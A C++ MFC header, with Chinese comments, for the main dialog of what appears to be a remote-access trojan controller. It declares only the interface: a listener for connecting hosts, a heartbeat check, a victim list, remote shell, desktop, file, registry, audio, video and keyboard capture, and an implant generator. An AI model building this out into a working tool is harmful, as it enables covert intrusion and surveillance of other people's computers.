// maizangDlg.h : header file
//

#if !defined(AFX_MAIZANGDLG_H__C18CA6CC_DFC3_48E2_9964_383C64C63ADC__INCLUDED_)
#define AFX_MAIZANGDLG_H__C18CA6CC_DFC3_48E2_9964_383C64C63ADC__INCLUDED_
#include"TrueColorToolBar.h"
#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include"TrueColorToolBar.h"
#include<winsock2.h>
#pragma comment(lib,"ws2_32.lib")//和上面那句一起 套接字的编写头文件及库
 
#include "AutoLock.h"
#include "FileManage.h"
/////////////////////////////////////////////////////////////////////////////
// CMaizangDlg dialog

#define  WM_FILEDLGSHOW WM_USER + 0x1110
#define  WM_SCREENDLGSHOW WM_USER + 4000
#define  WM_CMD_DLG_SHOW WM_USER + 912
#define  WM_PROCESS_SHOW WM_USER + 914
#define  WM_WINDOW_MANAGER_DLG_SHOW WM_USER + 1150
typedef struct tagSocketInput
{
	SOCKET sMainConnect;
    SOCKET sHelpConnect;
}SocketInput, *LPSocketInput;
class CMaizangDlg : public CDialog
{
// Construction
public:
	//创建工具栏
	void CreatToolBar();

    //创建状态栏
	void CreatStatusBar();

	////开启端口号监听  并创建线程处理主机上线 和心跳包
    void StartListen(int Port);

	//停止监听
	void StopListen();

	//消息列表输出消息的处理 在主界面最下面的一行(状态栏)的第一个分隔框内输出信息 
	void ShowMessage(bool bIsOk,CString strMsg); 

	//添加上线条目
	void AddOnlineList(SOCKET socket, CString strIP,CString strAddr,CString strPCName,CString strOS,CString strCPU,CString strVideo,CString strMemSz); 

    // standard constructor
	CMaizangDlg(CWnd* pParent = NULL);	
  
// Dialog Data
	//{{AFX_DATA(CMaizangDlg)
	enum { IDD = IDD_MAIZANG_DIALOG };
	CListCtrl	m_List_Online;    //控件变量 与上线窗口相关
	CListCtrl	m_List_Message;   //控件变量 与上线信息窗口相关
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CMaizangDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	HICON m_hIcon;
    CStatusBarCtrl  m_wndStatusBar;
	CTrueColorToolBar m_ToolBar;
	CriticalSection cOnlineLock;


	// Generated message map functions
	//{{AFX_MSG(CMaizangDlg)

	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnRclickOnline(NMHDR* pNMHDR, LRESULT* pResult);//当右击上线列表处应该起到的反应
	afx_msg void OnOnlineDelete();//选中某个主机断开连接后的处理
	afx_msg void OnMainClose();//菜单栏的退出功能实现
	afx_msg void OnMainAbout();//显示主菜单中的关于对话框
	afx_msg void OnOnlineAudio();//声音管理
	afx_msg void OnOnlineCmd();//远程终端
	afx_msg void OnOnlineDesktop();//远程桌面管理
	afx_msg void OnOnlineFlie();//文件管理
	afx_msg void OnOnlineProcess();//进程管理
	afx_msg void OnOnlineRegistry();//注册表管理
	afx_msg void OnOnlineServer();//服务管理
	afx_msg void OnOnlineVidio();//视频管理
	afx_msg void OnOnlineWindow();//窗口管理
	afx_msg void OnCreateServer();//生成服务端
	//}}AFX_MSG

	// 产生文件传输窗口
    afx_msg LRESULT OnFileDlgShow(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnScreenDlgShow(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnCmdDlgShow(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnProcessShow(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnWindowManagerDlgShow(WPARAM wParam, LPARAM lParam);
	DECLARE_MESSAGE_MAP()
private: 

	//CListCrl（消息列表 上线列表） 列信息名称的初始化 
	int InitList();

	//客户端对于服务端的消息的处理     小组成员接口
	friend unsigned  __stdcall AcceptSocket(void * pParam);

	//处理主机的上线  连接服务端  作套接字的创建等
	friend unsigned  __stdcall ThreadAccept(void * pParam);

	////在线检测线程  心跳包
    friend unsigned  __stdcall ThreadCheck(void * pParam);   
	void openDlg(int cmd);

    int    Online_computer_count;
	HANDLE hCheckThread; 
    SOCKET m_ChoseSocket;
	int m_CurrIndex;
	int     m_ListenPort;   	//监听端口      
	SOCKET m_ListenSock;
	HANDLE hAcceptThread;//接受线程返回值
	CString strStatusBar;
 
public:
	afx_msg void OnOnlineKeyboard();
	afx_msg void OnOnlineClassroom();
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_MAIZANGDLG_H__C18CA6CC_DFC3_48E2_9964_383C64C63ADC__INCLUDED_)



